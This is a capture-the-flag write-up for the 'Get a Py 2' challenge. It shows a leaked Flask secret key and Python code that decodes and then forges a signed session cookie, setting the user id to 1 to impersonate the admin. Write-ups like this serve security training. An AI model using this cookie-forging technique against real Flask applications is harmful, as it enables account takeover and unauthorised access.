# HackDalton: Get a Py 2 (Writeup)

> Warning! There are spoilers ahead

Upon loading the website, you can register for an account. Once you register for an account and log in, you are sent to a page with a field to order a pie, and text that displays your last order. 

We can use the expoilt that we used in Get a Py 1 to find the new Flask secret key: `b'\xce\x11s\xbcZ\xc1\xa4\x08\x1fX\xf5A!\xa1\xe68`. We can then use the new secret key to decode our session cookie:

```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer


def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)
```
(script inspired by @babldev's gist https://gist.github.com/babldev/502364a3f7c9bafaa6db)

We can find that the session key simply contains a user id, in this example, the cookie's contents are `{'id': 3}`. We can then modify the code above to encode a cookie:

```python
def encode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(cookie_str)
```

After replacing our old cookie with a new cookie of id `1` (assuming the admin was the first person to log into the site), we can then view the flag.